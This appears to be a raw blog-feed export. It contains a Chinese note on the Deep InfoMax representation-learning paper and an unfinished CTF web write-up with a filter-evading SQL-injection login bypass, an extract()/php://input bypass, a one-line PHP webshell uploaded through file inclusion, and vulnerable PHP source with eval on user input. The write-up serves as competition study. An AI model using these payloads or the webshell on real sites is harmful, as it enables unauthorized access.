<p>参考链接：<br><a href="https://xz.aliyun.com/t/52#toc-6" target="_blank" rel="noopener">https://xz.aliyun.com/t/52#toc-6</a><br><a href="http://yulige.top/?p=502" target="_blank" rel="noopener">http://yulige.top/?p=502</a><br><a href="http://shaobaobaoer.cn/archives/656/python-sandbox-escape" target="_blank" rel="noopener">http://shaobaobaoer.cn/archives/656/python-sandbox-escape</a><br><a href="https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/#%E4%BA%8C%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AFpython-%E7%9A%84%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/#%E4%BA%8C%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AFpython-%E7%9A%84%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8</a></p>
]]></content>
      <categories>
        <category>System Security</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>【论文笔记———DIM】Learning Deep Representations By Mutual Information Estimation and Maximization</title>
    <url>/2020/11/09/%E3%80%90%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0DIM%E3%80%91Learning-Deep-Representations-By-Mutual-Information-Estimation-and-Maximization/</url>
    <content><![CDATA[<p>arxiv：<a href="https://arxiv.org/abs/1808.06670" target="_blank" rel="noopener">https://arxiv.org/abs/1808.06670</a><br>code：<a href="https://github.com/rdevon/DIM" target="_blank" rel="noopener">https://github.com/rdevon/DIM</a><br>report video：<a href="https://www.youtube.com/watch?v=o1HIkn8LEsw&amp;t=256s" target="_blank" rel="noopener">https://www.youtube.com/watch?v=o1HIkn8LEsw&amp;t=256s</a></p>
<h1 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1 Introduction"></a>1 Introduction</h1><p>无监督学习一个重要的问题就是学习有用的 representation，本文的目的就是训练一个 representation learning 函数（即编码器encoder） ，其通过最大编码器输入和输出之间的互信息(MI)来学习对下游任务有用的 representation，而互信息可以通过 MINE $^{[1]}$的方法进行估算。</p>
<p>作者还提到，直接最大化全部输入和编码器的输出（即全局的MI）更适合于重建性的任务，而在分类的下游任务上效果不太好。而最大化输入的局部区域（例如不是完整的图片，而是图片中的一块）和输出（即学到的representation）的平均互信息在下游任务（如图像分类）上的效果更好。</p>
<p>因为这种方法类似于对抗自动编码器(AEE, adversarial autoencoders)$^{[2]}$的，将MI最大化和先验匹配结合起来，根据期望的统计特性约束 representation，并且还与 infomax 的优化规则密切相关$^{[3]}$，因此作者称其为 Deep InfoMax(DIM).</p>
<p>因此，文章的主要贡献如下：</p>
<ul>
<li>提出了 Deep InfoMax(DIM)，可以同时估算和最大化输入数据和高级representation之间的互信息(MI)</li>
<li>作者提出的最大化互信息的方法，可以根据下游任务是分类还是重建，来对优化全局还是局部的信息进行调整。</li>
<li>使用对抗学习约束representation，来使其具有特定于先验的期望统计特征</li>
<li>介绍了两种测量 representation 质量的新方法，一个基于Mutual Information Neural Estimation(MINE)$^{[1]}$，一个基于neural dependency measure(NDM)$^{[4]}$，并用它们将DIM与其他无监督学习方法进行比较</li>
</ul>
<p><br></p>
<h1 id="2-Objectives-of-Deep-InfoMax"><a href="#2-Objectives-of-Deep-InfoMax" class="headerlink" title="2 Objectives of Deep InfoMax"></a>2 Objectives of Deep InfoMax</h1><p>首先，先来看一下传统的图像 encoder 结构 ，如下图：</p>
<p><img src="/2020/11/09/【论文笔记DIM】Learning-Deep-Representations-By-Mutual-Information-Estimation-and-Maximization/20201107154017789.png" alt="在这里插入图片描述"></p>
<p>$x$ 表示原始图像，$f_{\psi}(x)$ 表示经过卷积层输出的 $M×M$（注意，DIM 里的  $M×M$  指的是 $M×M$ 块，而不是像素）的 feature map，而 $y=h_{\psi}\left(f_{\psi}(x)\right)$ 则为经过全连接层之后最终的 feature vector（也可以理解为图像的一种 representation），再将这个 representation 应用于一些下游任务，如分类。</p>
<p>而 DIM 的整体思路如下图，也就是“用图片 encode 后得到的 representation（$y$），与同一张图片的 feature map 组成正样本对，和另一张图片的 feature map 组成负样本对，然后利用 GAN 的思想训练一个 Discriminator 来区分这两中样本对”。<br><img src="/2020/11/09/【论文笔记DIM】Learning-Deep-Representations-By-Mutual-Information-Estimation-and-Maximization/20201107154035986.png" alt="在这里插入图片描述"></p>
<p>既然要训练 Discriminator ，就不得不提一下 DIM 的损失函数，那么就得先说一下其优化目标。</p>
<p>首先，我们定义一些数学符号：<br>
- $x∈X$为 image 数据集；编码器 encoder 为 ${ E }_{\psi}=h_{\psi} \circ f_{\psi}$ （ $\circ$ 表示是由后面那两个函数组成 ）； $f_{\psi}(x)$ 表示由将原始图像 $x$ 映射到 feature map； $h_{\psi}(f_{\psi}(x))$  表示将 feature map 再映射到最后的输出 representation，即 $y=h_{\psi}(f_{\psi}(x))=E_{\psi}(x) ∈ Y$。
</p>
<ul>
<li>将样本从 $f_{\psi}(X)$ 经过 $h_{\psi}$ 得到的 $y∈Y$ 的分布，也叫做 ”push-forward distribution“（目前还不是很理解这个名词），记作$Q_{\psi,X}$</li>
</ul>
<p>而 DIM 最终的优化目标也就是以下两点：</p>
<ul>
<li>最大化 $f_{\psi}(X)$ 和 $Y$ 之间的互信息。（作者根据具体任务的不同，又分为了 global 和 local 两种，后面再提）</li>
<li>在最终的 representation 中再加入一个统计性的约束，使得到的 $y$ 的分布（push-forward distribution）$Q_{\psi,X}$尽量与先验分布 $Q_{prior}$ 相匹配，有点类似对抗自编码器（AAE）。</li>
</ul>
<p><br></p>
<h1 id="3-Loss-function"><a href="#3-Loss-function" class="headerlink" title="3 Loss function"></a>3 Loss function</h1><h3 id="Global-Infomax"><a href="#Global-Infomax" class="headerlink" title="Global Infomax"></a>Global Infomax</h3><p>知道了优化目标，下面就是如何去建立和推导该目标的数学表达方式。</p>
<p>我们首先解决第一个优化目标，也就是最大化互信息。互信息就是衡量两个变量的相关性，如果 $X$ 和 $Y$ 相互独立，即$P_{XY}=P_{X}P_{Y}$，那么它们的互信息 $I(X;Y)$ 也就为0。互信息的定义如下：<br>$$<br>\begin{aligned}<br>\mathcal I(X;Y) &amp;=\sum_{X, Y} P(X, Y) \log \frac{P(X \mid Y)}{P(X)} \<br>\end{aligned} \tag 1<br>$$<br>KL散度则是衡量同一个随机变量两个分布之间的差异，其值越小，说明分布越接近，定义如下：<br>$$<br>\begin{aligned}<br>\mathcal D_{KL}(X||Y) &amp;=\mathbb{E}_{P_{X Y}}[\log \frac{P(X)}{P(Y)}] \<br>\end{aligned} \tag 2<br>$$<br>MI和KL散度之间的关系也不难推导，如下：</p>

$$
\begin{aligned}
\mathcal I(X;Y) &=\sum_{X, Y} P(X, Y) \log \frac{P(X \mid Y)}{P(X)} \\
&=\iint P(X,Y)log \frac{P(X|Y)}{P(X)} \\
&=\mathbb{E}_{P_{X Y}}[log \frac{P(X|Y)}{P(X)}] \\
&=\mathbb{E}_{P_{X Y}}[log \frac{P(X,Y)}{P(X)P(Y)}] \\
&=\mathcal D_{K L}(P_{X Y}||P(X)P(Y))
\end{aligned} \tag 3
$$

<p>因为互信息没办法精确的计算，但是已经有一些算法可以对其进行估计，作者首先使用了Mutual Information Neural Estimation（MINE）$^{[1]}$方法，其基于KL散度的 Donsker-Varadhan representation  给出了互信息的下限，如下公式：</p>

$$
\mathcal{I}(X ; Y):=\mathcal{D}_{K L}(\mathbb{J}|| \mathbb{M}) \geq \widehat{\mathcal{I}}_{\omega}^{(D V)}(X ; Y):=\mathbb{E}_{\mathbb{J}}\left[T_{\omega}(x, y)\right]-\log \mathbb{E}_{\mathbb{M}}\left[e^{T_{\omega}(x, y)}\right] \tag 4
$$


上式中的  $\mathbb{J}$ 表示 $X$ 和 $Y$ 的联合分布 $P_{X Y}$，$\mathbb{M}$ 表示 $X$ 和 $Y$ 的边缘分布的乘积 $P_{X}P_{y}$，$T_{\omega}$ 表示参数为 $\omega$ 的鉴别器。


更具体来说，这里的 $X$ 为图像的 feature map（ $f_{\psi}(X)$ ），$Y$ 为图像编码后的得到的 representation（$E_{\psi}(X)$）。 $P_{XY}$ 表示图片的  $f_{\psi}(X)$ 和其 $E_{\psi}(X)$ 之间的联合分布（因为来自同一张图片），而 $P_{ \tilde X}P_Y$ 表示另一张图片 $f_{\psi}(\tilde X)$ 和同一个 $E_{\psi}(X)$ 之间这两个边缘分布的乘积（因为来自不同的图片）。**前者需要最大化，而后者需要最小化**。因为鉴别器 $T_{\psi}$ 接收两个参数  $f_{\psi}(X) / f_{\psi}(\tilde X)$ 和 E_{\psi}(X)$，然后输出一个分数，表示有多大的把握确信这个 feature map 是对应于这个 representation的（即来自同一张图片），显然来自同一张图片的输出越大越好，来自不同图片的输出越小越好。

<p>因此最大化 $\mathcal I(X;Y)$ 的目标变成了最大化其的下限  $\widehat{\mathcal{I}}_{\omega}^{(D V)}(X ; Y)$，而又转化为了一个对抗训练问题。这样，我们就可以写出这一目标的损失函数了，如下（$\psi$ 为编码器 $E$ 的参数，$\omega$ 为鉴别器的参数）：</p>

$$
\begin{aligned}
loss_G&=\underset{\omega, \psi}{\max} \widehat{\mathcal{I}}_{\omega}^{(D V)}(f_{\psi}(X);E_{\psi}(X)) \\
&=\underset{\omega, \psi}{\max} \mathbb{E}_{P_{XY}}\left[T_{\omega}(f_{\psi}(X),E_{\psi}(X))\right]-\log \mathbb{E}_{P_X×P_{\tilde X}}\left[e^{T_{\omega}(f_{\psi}(X),E_{\psi}(X))}\right] \\
&=\underset{\omega, \psi}{\min} -(\mathbb{E}_{P_{XY}}\left[T_{\omega}(f_{\psi}(X),E_{\psi}(X))\right]-\log \mathbb{E}_{P_X×P_{\tilde X}}\left[e^{T_{\omega}(f_{\psi}(X),E_{\psi}(X))}\right])
\end{aligned} \tag 5
$$

<p>但由于我们的优化目标并不需要知道 MI 的具体估计值，而只需要能够将其最大化即可，所以我们不一定需要使用 KL 散度（也就是基于 DV representation 的方法），因此将上述损失函数可以写成更广泛的形式，如下：</p>

$$
\begin{aligned}
loss_G&=\underset{\omega, \psi}{\max}\widehat{\mathcal{I}}_{\omega}\left(f_{\psi}(X) ; E_{\psi}({X})\right) \\
&=\underset{\omega, \psi}{\min}-\widehat{\mathcal{I}}_{\omega}\left(f_{\psi}(X) ; E_{\psi}({X})\right) 
\end{aligned} \tag 6
$$

<p>式子中的 $\widehat{\mathcal{I}}_{\omega}$ 可以换成其他的 MI 估计器，只要能给出 MI 的边界将其进行最大化即可。在文章中，作者尝试了 Jensen-Shannon MI estimator $^{[4]}$ 和 infoNCE $^{[5]}$ 两种方法，如下，并对其各自的优势与性能进行了比较分析：</p>

$$
\widehat{\mathcal{I}}_{\omega, \psi}^{(\mathrm{JSD})}\left(X ; E_{\psi}(X)\right):=\mathbb{E}_{\mathbb{P}}\left[-\operatorname{sp}\left(-T_{\psi, \omega}\left(x, E_{\psi}(x)\right)\right)\right]-\mathbb{E}_{\mathbb{P} \times \tilde{\mathbb{P}}}\left[\operatorname{sp}\left(T_{\psi, \omega}\left(x^{\prime}, E_{\psi}(x)\right)\right)\right] \\
,where \space sp(z)=log(1+e^z) \tag 7
$$


$$
\widehat{\mathcal{I}}_{\omega, \psi}^{(\mathrm{infoNCE})}\left(X ; E_{\psi}(X)\right):=\mathbb{E}_{\mathbb{P}}\left[T_{\psi, \omega}\left(x, E_{\psi}(x)\right)-\mathbb{E}_{\tilde{\mathbb{P}}}\left[\log \sum_{x^{\prime}} e^{T_{\psi, \omega}\left(x^{\prime}, E_{\psi}(x)\right)}\right]\right] \tag 8
$$

<p>可以看到，我们上面得到的损失函数有一个下标 $G$，实际上就是代表这是 Global 情况下的目标。所谓 Gloabl ，也就是说我们是直接最大化整个图像的输入和输出之间的互信息的，在说什么是 Local Infomax 之前，再总结一下 Global Infomax 的流程：</p>
<p>（1）从数据集中取样原始图像 $x_+^{(1)},\dots,x_+^{(n)} \sim P_X$ ，然后计算 feature map $f_{\psi}(x_+^{(i)}) \forall_i $</p>
<p>（2）计算图像的 representation $y^{(i)}=h_{\psi}(f_{\psi}(x_+^{(i)}))$</p>
<p>（3）将 ${(f_{\psi}(x_+^{(i)}),y^{i})}$ 组成正样本对</p>
<p>（4）从数据集中取样不同的图像 $x_{-}^{(1)},\dots,x_{-}^{(n)} \sim P_X$，然后计算 feature map $f_{\psi}(x_{-}^{(i)}) \forall_i $</p>
<p>（5）将 ${(f_{\psi}(x_-^{(i)}),y^{i})}$ 组成负样本对</p>
<p>（6）通过优化编码器的参数 $\psi$ 和鉴别器的参数 $\omega$ 来最小化$-(\frac{1}{n} \sum_{i=1}^{n}T_{\psi}(f_{\psi}(x_+^{(i)}),y^{(i)}))-log \frac{1}{n} \sum_{i=1}^{n} e^{T_{\psi}(f_{\psi}(x_-^{(i)}),y^{(i)}))})$</p>
<h3 id="Local-Infomax"><a href="#Local-Infomax" class="headerlink" title="Local Infomax"></a>Local Infomax</h3><p>先说一下为什么要提出 Local Infomax？直觉上来看，对于一张图片来说，如果我们的下游任务不是重建类的任务，只是对图片进行分类，那么就没有必要对一些琐碎或者对分类任务无关紧要的像素。而如果我们的目标是最大化整张输入图片的 feature map 与 representation，那么编码器为了符合最后的全局最优情况，就有可能会选择到这些对下游任务并无实际作用的部分进行编码，这样得到的 representation 就肯定不会是针对下游任务最优的 representation。</p>
<p>而 Local Infoamx 的思想就是，我们并不将整张图片的 feature map 一次性输入损失函数来进行 MI 最大化，而是将其分为 $M×M$块（$M$ 不是指像素，而是指被分成了 $M^2$ 个块），一次输入一个块和同一个 representation，最终目标是使这 $M^2$ 个块和整张图片的 representation 的平均 MI 达到最大。这样就可以使给每个块之间共享的一些信息进行编码。</p>
<p>文章中也用实验证明了，根据下游任务的不同，Local Inofmax 在图像分类等一些下游任务中确实具有更好的效果。</p>
<p>因此，也就很容易写出 Local Infomax 的损失函数（与 $loss_G$ 的 $\omega$ 不是同一个）：</p>

$$
\begin{aligned}
loss_L&=\underset{\omega, \psi}{\max} \frac{1}{M^{2}} \sum_{i=1}^{M^{2}} \widehat{\mathcal{I}}_{\omega, \psi}\left(f_{\psi}^{(i)}(X) ; E_{\psi}(X)\right) \\
&=\underset{\omega, \psi}{\min} \frac{1}{M^{2}} -\sum_{i=1}^{M^{2}} \widehat{\mathcal{I}}_{\omega, \psi}\left(f_{\psi}^{(i)}(X) ; E_{\psi}(X)\right)
\end{aligned} \tag 9
$$

<p>总结一下 Local Infomax 的流程：<br>
（1）从数据集中取样原始图像 $x_+^{(1)},\dots,x_+^{(n)} \sim P_X$ ，然后计算 feature map $f_{\psi}(x_+^{(i)}) \space \forall_i $

（2）计算图像的 representation $y^{(i)}=h_{\psi}(f_{\psi}(x_+^{(i)})) \space \forall_i$

（3）将 ${(f_{\psi}(x_+^{(i)})_j,y^{i})} \space \forall_j$ 组成正样本对

（4）从数据集中取样不同的图像 $x_{-}^{(1)},\dots,x_{-}^{(n)} \sim P_X$，然后计算 feature map $f_{\psi}(x_{-}^{(i)}) \forall_i $

（5）将 ${(f_{\psi}(x_-^{(i)})_j,y^{i})} \space \forall_j$ 组成负样本对

（6）通过优化编码器的参数 $\psi$ 和鉴别器的参数 $\omega$ 来最小化 $-\frac{1}{M^2} \sum_{j=1}^{M^2}(\frac{1}{n} \sum_{i=1}^{n}T_{\psi}(f_{\psi}(x_+^{(i)})_j,y^{(i)}))-log \frac{1}{n} \sum_{i=1}^{n} e^{T_{\psi}(f_{\psi}(x_-^{(i)})_j,y^{(i)}))})$
</p>
<p>看起来和 Global Infomax 的流程差不多，主要是在第（3）（5）步中，现在需要对每个 patch 执行此操作（也就是Global的 $M^2$ 倍） ，而之所以只用 $j$ 来对 patch 进行索引，是因为 patch 在哪一行哪一列并不重要。第（5）步中的每个patch $j$ 则是来自另一张不同的图像。</p>
<p>Local Infomax的原理图如下：</p>
<p><img src="/2020/11/09/【论文笔记DIM】Learning-Deep-Representations-By-Mutual-Information-Estimation-and-Maximization/20201107154105913.png" alt="在这里插入图片描述"></p>
<p>至于怎么计算这个平均互信息，文章的附录中给了两种方法，一个是直接将最后的 representation（$Y$）复制然后接到 feature map(+) 的块后面形成real，接到 feature map(-) 后面形成 fake，然后再利用一个 $1×1$ 的卷积鉴别器对对进行评分，如下图：</p>
<p><img src="/2020/11/09/【论文笔记DIM】Learning-Deep-Representations-By-Mutual-Information-Estimation-and-Maximization/20201107154139778.png" alt="在这里插入图片描述"></p>
<p>另一种方法则是利用点击运算，即对 representation（$Y$）进行全连接网络的编码，每个块用一个 $1×1$ 的网络进行编码，最后得到的两个结果是想同纬度的，然后进行点乘操作得到对应块的分数：</p>
<p><img src="/2020/11/09/【论文笔记DIM】Learning-Deep-Representations-By-Mutual-Information-Estimation-and-Maximization/20201107154155650.png" alt="在这里插入图片描述"></p>
<h3 id="Matching-representations-to-prior"><a href="#Matching-representations-to-prior" class="headerlink" title="Matching representations to prior"></a>Matching representations to prior</h3><p>若学习到的隐变量服从标准正态分布的先验分布，这有利于使得编码空间更加规整，甚至有利于解耦特征，便于后续学习。因此，在 DIM 中，我们同样希望加上这个约束，作者利用对抗自编码器（AAE）的思路引入对抗来加入这个约束，即训练一个新的鉴别器，而将编码器当做生成器。鉴别器的目标是区分 representation 分布的真伪（即是否符合先验分布），而编码器则是尽量欺骗判别器，输出更符合先验分布的 representation，如下图：</p>
<p><img src="/2020/11/09/【论文笔记DIM】Learning-Deep-Representations-By-Mutual-Information-Estimation-and-Maximization/20201107154215742.png" alt="在这里插入图片描述"></p>
<p>具体做法是，训练另一个鉴别器$D_{\phi}$，我们需要学习到一种 representation 来让这个鉴别器 $D_{\phi}$ 确信其来自先验分布 $Q_{prior}$，这不就是一种对抗的思想。</p>
<p>训练该鉴别器的损失函数如下：</p>

$$
\begin{aligned}
loss_{matching}&=\underset{\psi}{ \min } \underset{\phi}{ \max } \widehat{\mathcal{D}}_{\phi}\left(Q_{prior} \| Q_{\psi,X}\right) \\
&=\underset{\psi}{ \min } \underset{\phi}{ \max } \mathbb{E}_{Q_{prior}}\left[\log D_{\phi}(y)\right]+\mathbb{E}_{Q_{\psi,X}}\left[\log \left(1-D_{\phi}\left(E_{\psi}(x)\right)\right)\right]
\end{aligned} \tag {10}
$$

<h3 id="Final-loss"><a href="#Final-loss" class="headerlink" title="Final loss"></a>Final loss</h3><p>将上面三个目标整合后，也就得到了 DIM 的最终目标，如下：</p>

$$
\begin{aligned}
&\underset{\omega_1, \psi}{\max} \alpha \widehat{\mathcal{I}}_{\omega_1}(f_{\psi}(X);E_{\psi}(X)) \space\space\space\space\space\space\space\space\space\space\space\space\space\space\space\space\space\space\space\space\space\space\space\space (globa \space InfoMax)\\
&+\underset{\omega_2, \psi}{\max} \frac{\beta}{M^{2}} \sum_{i=1}^{M^{2}} \widehat{\mathcal{I}}_{\omega_2, \psi}\left(f_{\psi}^{(i)}(X) ; E_{\psi}(X)\right) \space\space\space (local \space InfoMax)\\
&+\underset{\psi}{ \min } \underset{\phi}{ \max } {\gamma}\widehat{\mathcal{D}}_{\phi}\left(Q_{prior} \| Q_{\psi,X}\right) \space\space\space\space\space\space\space\space\space\space\space\space\space\space\space\space\space\space (prior \space matching) \\
&=\underset{\omega_1,\omega_2,\psi}{\min} (-\alpha\widehat{\mathcal{I}}_{\omega_1}(f_{\psi}(X);E_{\psi}(X)) - \frac{\beta}{M^{2}}\sum_{i=1}^{M^{2}} \widehat{\mathcal{I}}_{\omega_2, \psi}\left(f_{\psi}^{(i)}(X) ; E_{\psi}(X)\right)) + \underset{\psi}{ \min } \underset{\phi}{ \max } {\gamma}\widehat{\mathcal{D}}_{\phi}\left(Q_{prior} \| Q_{\psi,X}\right)
\end{aligned}
$$

<p>之所以加上$\alpha、\beta、\gamma$三个参数，是因为有时候我们只想使用 global InfoMax (如重建类下游任务)，就可以将 $\beta$ 设置为0；而有时候只想使用 Iocal InfoMax (如分类任务)，就可以将 $\alpha$ 设置为0；但这两种情况下，最佳的$\gamma$是不同的，所以也需要 $\gamma$ 来进行调节。</p>
<p><br></p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>[1] Ishmael Belghazi, Aristide Baratin, Sai Rajeswar, Sherjil Ozair, Y oshua Bengio, Aaron Courville, and R Devon Hjelm. Mine: mutual information neural estimation. arXiv preprint arXiv:1801.04062, ICML’2018, 2018.</p>
<p>[2] Alireza Makhzani, Jonathon Shlens, Navdeep Jaitly, Ian Goodfellow, and Brendan Frey. Adversarial autoencoders. arXiv preprint arXiv:1511.05644, 2015.</p>
<p>[3] Anthony J Bell and Terrence J Sejnowski. An information-maximization approach to blind separation and blind deconvolution. Neural computation, 7(6):1129–1159, 1995.</p>
<p>[4] Philemon Brakel and Y oshua Bengio. Learning independent features with adversarial nets for non-linear ica. arXiv preprint arXiv:1710.05050, 2017.</p>
<p>[5] Sebastian Nowozin, Botond Cseke, and Ryota Tomioka. f-gan: Training generative neural samplers using variational divergence minimization. In Advances in Neural Information Processing Systems, pp. 271–279, 2016.</p>
<p>[6] Aaron van den Oord, Yazhe Li, and Oriol Vinyals. Representation learning with contrastive predictive coding. arXiv preprint arXiv:1807.03748, 2018.</p>
]]></content>
      <categories>
        <category>PaperNote</category>
      </categories>
      <tags>
        <tag>自监督学习</tag>
      </tags>
  </entry>
  <entry>
    <title>第五空间Writeup_Web</title>
    <url>/2019/09/01/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4Writeup-Web/</url>
    <content><![CDATA[<h1 id="空相"><a href="#空相" class="headerlink" title="空相"></a>空相</h1><p>（1）进入页面，提示了参数id </p>
<p><img src="/2019/09/01/第五空间Writeup-Web/20190903160325343.png" alt="在这里插入图片描述"></p>
<p>（2）尝试一下：?id=1‘<br><img src="/2019/09/01/第五空间Writeup-Web/20190903160348218.png" alt="在这里插入图片描述"></p>
<p>（3）访问该文件，并加上队伍的token作为参数即可，<br><img src="/2019/09/01/第五空间Writeup-Web/2019090316072259.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="五叶"><a href="#五叶" class="headerlink" title="五叶"></a>五叶</h1><p>（1）进入后，是一个登陆界面</p>
<p><img src="/2019/09/01/第五空间Writeup-Web/20190903160801767.png" alt="在这里插入图片描述"><br>（2）这一题比较脑洞，实际上是用万能密码来进行登陆admin账号。</p>
<ul>
<li><p>经过测试：过滤了*、=、and、or、from、select、union、insert、update等，单引号加括号闭合。</p>
</li>
<li><p>猜测后台sql语句可能为：<code>select * form xxx where password = (‘$password’);</code></p>
</li>
<li><p>于是构造密码为：<code>1’) || username like ‘admin’--</code>（最后有个空格）</p>
</li>
<li><p>拼接后为： <code>….  where password =(‘1’) || username=&#39;admin&#39; --</code></p>
</li>
</ul>
<p><img src="/2019/09/01/第五空间Writeup-Web/2019090316091050.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="六尘（非预期）"><a href="#六尘（非预期）" class="headerlink" title="六尘（非预期）"></a>六尘（非预期）</h1><p>（1）扫目录得到/log/</p>
<p><img src="/2019/09/01/第五空间Writeup-Web/20190903160951628.png" alt="在这里插入图片描述"></p>
<p>（2）访问如下，可以直接看到access.log的内容：</p>
<p><img src="/2019/09/01/第五空间Writeup-Web/20190903161003750.png" alt="在这里插入图片描述"></p>
<p>（3）在access.log日志中搜索关键词flag，发现存在flagishere目录，访问里面的文件，并替换token即可。</p>
<p><img src="/2019/09/01/第五空间Writeup-Web/20190903161018938.png" alt="在这里插入图片描述"></p>
<p><strong>预期解</strong>：通过SSRF扫描端口 + gopher协议攻击内网的Struts2，题目环境开的时间太短了，没来得及复现..</p>
<p><br></p>
<h1 id="空性"><a href="#空性" class="headerlink" title="空性"></a>空性</h1><p>（1）进入后，是一个登陆界面，发现这里右键查看不了代码（用了一段JS代码实现的），F12或BP抓包看到如下一段JS代码，用户名和密码均为Youguess，但实际上我们直接访问那个文件即可。<br><img src="/2019/09/01/第五空间Writeup-Web/2019090316112880.png" alt="在这里插入图片描述"></p>
<p>（2）访问./151912db206ee052.php，页面上除了显示“听说你的Linux用的很6？”这句话以外，得不到任何有用信息，于是考虑文件泄露。</p>
<p>Linux下的vim编辑器在非正常退出的情况下会自动生成swp后缀的备份文件，由于此类格式文件无法解析，此时便可以通过浏览器直接下载此敏感文件，这导致程序的源码泄漏。</p>
<p>（3）于是访问 xxx/.151912db206ee052.php.swp下载文件，并通过命令<code>vi –r [文件名]</code>进行恢复。</p>
<p><img src="/2019/09/01/第五空间Writeup-Web/20190903161215948.png" alt="在这里插入图片描述"></p>
<p>（4）审计代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">First</span></span>&#123;  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">firstlevel</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        $a=<span class="string">'whoami'</span>;  </span><br><span class="line">        extract($_GET);  </span><br><span class="line">        $fname = $_GET[<span class="string">'fname'</span>]?$_GET[<span class="string">'fname'</span>]:<span class="string">'./js/ctf.js'</span>;  </span><br><span class="line">        $content=trim(file_get_contents($fname));  </span><br><span class="line">        <span class="keyword">if</span>($a==$content)  </span><br><span class="line">        &#123;  </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'ok'</span>;;  </span><br><span class="line">        <span class="keyword">else</span>  </span><br><span class="line">        &#123;  </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'听说你的Linux用的很6？'</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$execfirst = <span class="keyword">new</span> First();  </span><br><span class="line">$execfirst -&gt; firstlevel();  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>利用方式一：PHP伪协议——php://input，所以构造：<code>?fname=php://input</code>，并POST数据：<code>whoami</code></p>
</li>
<li><p>利用方式二：变量覆盖——extract()，注意到<code>$a==$content</code>进行的是松散比较，所以构造payload：<code>?a=&amp; fname=lethe</code><br><img src="/2019/09/01/第五空间Writeup-Web/20190903161506717.png" alt="在这里插入图片描述"></p>
</li>
</ul>
<p>（5）上一层成功绕过后，会进入到一个上传界面，通过白名单严格的限制了上传文件的后缀，且对文件内容中的eval()、system()、 phpinfo()等许多函数进行了检测，所以想按一般的文件上传getshell是不行的。</p>
<p> fuzz+脑洞，发现可以上传html后缀的文件，但是上传html文件有什么用呢，并不能解析其中的php代码。</p>
<p>看到url中的参数有<code>file=xxxxxx</code>这个参数，很像文件包含的题目形式。</p>
<p><img src="/2019/09/01/第五空间Writeup-Web/20190903161552691.png" alt="在这里插入图片描述"></p>
<p>测试发现<code>http://111.33.164.6:10003/3792689baaabc7eb</code>本身就是一个上传页面，猜测存在文件包含。</p>
<p>于是构造html文件的内容为：<code>&lt;?php $f = $_GET[f]; $f($_GET[s]); ?&gt;</code>         </p>
<p>上传后，修改url中file参数的值，<code>?file=upload/xxxxxxxx</code>（上传的文件目录，去掉文件后缀），然后传入相应参数，即可getshell。</p>
<p><br></p>
<h1 id="八苦"><a href="#八苦" class="headerlink" title="八苦"></a>八苦</h1><p>这一题下午的时候坏了，一直到最后都没修复好…</p>
<p>（1）进入后发现页面上，只有一个welcome，最后扫描发现是<code>.phps</code>上有源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// flag.php in /var/html/www</span></span><br><span class="line"></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">		<span class="keyword">protected</span> $careful;</span><br><span class="line">        <span class="keyword">public</span> $securuty;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;careful===<span class="number">1</span>)&#123;</span><br><span class="line">				phpinfo();	<span class="comment">// step 1:	read source,get phpinfo and read it carefullt</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;securuty[$name];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($param1,$param2)</span></span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$param1&#125;)&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="string">'$a='</span>.$_GET[<span class="string">'dangerous'</span>].<span class="string">';'</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $user;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;user=<span class="keyword">new</span> Welcome();</span><br><span class="line">			<span class="keyword">$this</span>-&gt;user-&gt;say_hello();  </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	